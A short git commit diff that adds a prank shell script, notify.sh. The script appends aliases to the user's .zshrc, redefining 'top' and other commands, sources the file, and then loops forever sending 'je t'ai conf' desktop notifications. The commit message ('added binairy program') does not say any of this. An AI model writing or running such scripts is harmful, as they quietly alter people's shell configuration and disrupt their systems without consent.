f65440cc9cf18315b5ce6c61a8065dbffe114b41
Yannis <yannis@localhost.localdomain>
2017-11-21 22:34:01 +0100

    added binairy program

--- notify.sh
+++ notify.sh
@@ -1,3 +1,10 @@
+#!/bin/bash
+
+echo alias top="'yes nop interdit'" >> ../.zshrc
+echo alias 1="'top'" >> ../.zshrc
+echo alias 2="'notify-send test comment '" >> ../.zshrc
+cd ..
+source .zshrc
 while true; do
     notify-send "je t'ai conf"
 done
